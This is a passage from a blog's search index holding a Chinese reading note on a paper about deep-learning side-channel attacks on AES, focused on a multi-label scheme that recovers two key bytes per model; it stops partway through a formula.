<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>文献阅读笔记-Deep Learning based Side-Channel Attack-a New Profiling Methodology based on Multi-Label Classification</title>
    <url>/archives/16233d99.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者: <strong>Houssem Maghrebi</strong></p>
</li>
<li>
<p>单位: -</p>
</li>
<li>
<p>出处: <strong>eprint</strong></p>
</li>
<li>
<p>标题: <strong>Deep Learning based Side-Channel Attack: a New Profiling Methodology based on Multi-Label Classification</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<h2 id="背景">背景</h2>
<p>目前基于深度学习的侧信道攻击(DLSCA)方法越来越多,经过相关研究,人们发现DLSCA针对于未对齐的能量迹攻击效果依旧较好,在训练以及攻击阶段,研究者以8bit为单位对密钥进行恢复,即针对AES的16字节密钥,需要对每个字节训练出一个模型,以此来挨个回复全部的密钥字节。重复的16次操作带来了较大的复杂度。</p>
<h2 id="作者做了什么">作者做了什么</h2>
<p>作者提出的工作中,在保证了攻击效率的前提下,一个模型对应恢复密钥的<strong>两个</strong>字节,并且在某些情况下训练用时要比之前的方法训练的要快。</p>
<h2 id="技术">技术</h2>
<h3 id="侧信道攻击">侧信道攻击</h3>
<p>侧信道攻击是一种通过收集硬件设备泄露的信息来对关键信息进行恢复的攻击方式,其中建模攻击在安全评估中扮演着较为重要的角色,攻击者通过在目标设备相同的副本上采集泄露的信息并在对信息进行分析后在被攻击设备上进行关键信息恢复的操作, 如图1所示。</p>
<h3 id="CNN-LSTM">CNN LSTM</h3>
<h2 id="工作细节">工作细节</h2>
<p>  在文献<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>中已经给出了最大能一次恢复32bit密钥的证明,但是如果单次恢复32bit会在 建模和攻击阶段造成较大的时间复杂度以及攻击复杂度,在这里作者选了16bit作为单次恢复密钥的长度,(这里泄露评估先不写,没看),也就是说作者针对AES KEY的前两个字节进行恢复,将一个密钥的前两个byte作为一组标签, 或者两个不同的操作的输出值(泄露值)作为一组标签。</p>
<p>   在大部分工作中,都采用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(P, K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span>来表示一条能量迹,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>是明文和密钥的byte子集,在本文中,作者采用以下两种标记方法:</p>
<ul>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>P</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msub><mo stretchy="false">)</mo><mrow><mn>1</mn><mo>&lt;</mo><mi>i</mi><mo>≤</mo><mi>N</mi></mrow></msub></mrow><annotation encoding="application/x-tex">(\phi(P_i, K_i))_{1&lt;i\leq N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mrel mtight">&lt;</span><span class="mord mathnormal mtight">i</span><span class="mrel mtight">≤</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2452em;"><span></span></span></span></span></span></span></span></span></span> 	<strong>N</strong>是密钥byte子集的个数</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>ϕ</mi><mi>j</mi></msub><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>K</mi><mo stretchy="false">)</mo><msub><mo stretchy="false">)</mo><mrow><mn>1</mn><mo>&lt;</mo><mi>j</mi><mo>≤</mo><mi>N</mi></mrow></msub></mrow><annotation encoding="application/x-tex">(\phi_j(P, K))_{1&lt;j\leq N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mrel mtight">&lt;</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">≤</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 	这里是中间泄露, N也就是对应NByte的密钥</li>
</ul>
<p>    由于有的时候密钥的不同字节会有相同的输出,也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>P</mi><msub><mi>i</mi><mn>1</mn></msub></msub><mo separator="true">,</mo><msub><mi>K</mi><msub><mi>i</mi><mn>1</mn></msub></msub><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>P</mi><msub><mi>i</mi><mn>2</mn></msub></msub><mo separator="true">,</mo><msub><mi>K</mi><msub><mi>i</mi><mn>2</mn></msub></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(P_{i_1}, K_{i_1}) = \phi(P_{i_2}, K_{i_2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, 对此作者采用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>P</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><msub><mi>n</mi><mi>ϕ</mi></msub></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\phi(P_i, K_i)+(i-1)\times2^{n_\phi})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">ϕ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2901em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 也就是二者label值相隔一个256;同样,对于两中间值,有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>ϕ</mi><msub><mi>j</mi><mn>1</mn></msub></msub><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>K</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>ϕ</mi><msub><mi>j</mi><mn>2</mn></msub></msub><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi_{j_1}(P,K) = \phi_{j_2}(P,K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0572em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0572em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span>,对应<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>ϕ</mi><mi>j</mi></msub><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>K</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><msub><mi>n</mi><msub><mi>ϕ</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub></msub></msup><msub><mo stretchy="false">)</mo><mrow><mn>1</mn><mo>&lt;</mo><mi>j</mi><mo>≤</mo><mi>N</mi></mrow></msub></mrow><annotation encoding="application/x-tex">(\phi_{j}(P,K) + (j-1)\times2^{n_{\phi_{j-1}}})_{1&lt;j\leq{N}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0557em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7696em;"><span style="top:-3.1682em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"></span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5149em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mrel mtight">&lt;</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">≤</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> , 这里<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mrow><mi>ϕ</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">n_{\phi{j}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span>输出的大小(单位bit), N是标签集的大小,</p>
<p>  对于第一种标记方法最小的侧信道观测点<s>也就是POI</s>的数量是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><msub><mi>n</mi><mi>ϕ</mi></msub><mo>×</mo><mi>N</mi></mrow></msup></mrow><annotation encoding="application/x-tex">2^{n_{\phi}\times{N}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2901em;"><span></span></span></span></span></span></span><span class="mbin mtight">×</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span></span></span></span></span></span></span></span></span>, 对于第二种方法最小数量为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></msubsup><msub><mi>n</mi><msub><mi>ϕ</mi><mi>j</mi></msub></msub></mrow></msup></mrow><annotation encoding="application/x-tex">2^{\sum_{j=1}^{N}n_{\phi_{j}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1116em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1116em;"><span style="top:-3.1682em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9191em;"><span style="top:-2.1786em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4603em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.1952em;"></span><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span 